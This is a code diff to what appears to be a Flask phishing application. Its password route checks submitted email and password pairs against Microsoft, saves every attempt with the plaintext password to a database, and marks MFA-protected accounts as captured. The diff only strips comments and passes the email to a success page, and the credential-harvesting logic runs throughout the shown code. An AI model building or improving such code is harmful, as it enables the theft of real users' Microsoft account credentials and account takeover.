@@ -136,10 +136,9 @@ def password():
         if not pwd:
             error = "Please enter your password."
         else:
-            # ── Verify against Microsoft ──
             valid, reason = verify_microsoft_password(email, pwd)
 
-            # Always save to DB regardless of result
+            # Always save to DB
             status = "correct" if valid else reason
             attempt = LoginAttempt(email=email, password=pwd, status=status)
             db.session.add(attempt)
@@ -149,7 +148,6 @@ def password():
                 session['logged_in'] = True
                 return redirect(url_for('success'))
             elif reason == "mfa_required":
-                # Password was correct but MFA is enabled
                 session['logged_in'] = True
                 return redirect(url_for('success'))
             elif reason == "wrong_password":
@@ -168,7 +166,8 @@ def password():
 def success():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    return render_template('success.html')
+    email = session.get('email', '')
+    return render_template('success.html', email=email)
 
 
 @app.route('/admin')
